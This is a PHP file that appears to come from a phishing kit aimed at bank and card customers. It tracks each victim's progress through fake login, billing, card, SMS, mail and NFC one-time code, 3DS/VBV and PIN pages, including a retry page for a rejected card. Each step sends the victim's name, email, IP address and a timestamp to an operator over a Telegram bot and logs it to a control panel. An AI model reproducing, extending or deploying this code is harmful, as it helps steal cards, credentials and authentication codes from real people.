<?php
session_start();
require_once '../config.php';
require_once __DIR__ . '/panel_bridge.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['ok' => false]);
    exit;
}

require_once '../functions.php';

$page = $_POST['page'] ?? '';
$ip = _ip();
$email = $_SESSION['email'] ?? '';
$firstName = $_SESSION['firstName'] ?? '';
$lastName = $_SESSION['lastName'] ?? '';
$fullName = trim("$firstName $lastName") ?: $email ?: $ip;

$pageLabels = [
    'captcha'    => '🔒 Page Captcha',
    'login'      => '🔑 Page Login',
    'information'=> 'ℹ️ Page Information',
    'billing'    => '📋 Page Billing',
    'card'       => '💳 Page Card',
    'otp_sms'    => '📱 Page OTP SMS',
    'otp_mail'   => '📧 Page OTP Mail',
    'otp_nfc'    => '💳 Page OTP NFC',
    'vbv'        => '🔐 Page 3DS/VBV',
    'pin'        => '🔢 Page Code PIN',
    'custom'     => '✏️ Page Custom',
    'loading'    => '⏳ Page Loading',
    'card_retry' => '❌ Retour page Carte (BAD CC)',
];

$label = $pageLabels[$page] ?? $page;

if (!empty($page) && isset($pageLabels[$page])) {
    $notif = "{$label}\n┊ 👺 {$fullName}\n┊ 🪼 IP : {$ip}\n┊ 🪼 " . date('d/m H:i');
    @file_get_contents('https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $id_cc . '&text=' . urlencode($notif));
}

panelHeartbeat();
if (!empty($page)) panelSessionAddStep('page_' . $page);
echo json_encode(['ok' => true]);
